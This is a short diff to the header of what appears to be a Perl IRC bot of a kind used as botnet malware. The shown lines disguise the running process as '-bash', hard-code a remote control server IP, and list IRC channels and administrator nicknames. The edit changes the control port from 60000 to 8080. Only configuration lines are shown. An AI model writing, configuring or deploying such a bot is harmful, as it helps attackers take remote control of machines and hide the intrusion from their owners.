@@ -1,7 +1,7 @@
 #!/usr/bin/perl
 my $processo = '-bash';
 $servidor='38.72.132.198' unless $servidor;
-my $porta='60000';
+my $porta='8080';
 my @canais=("#cool cool!#");
 my @adms=("del","spy");
 
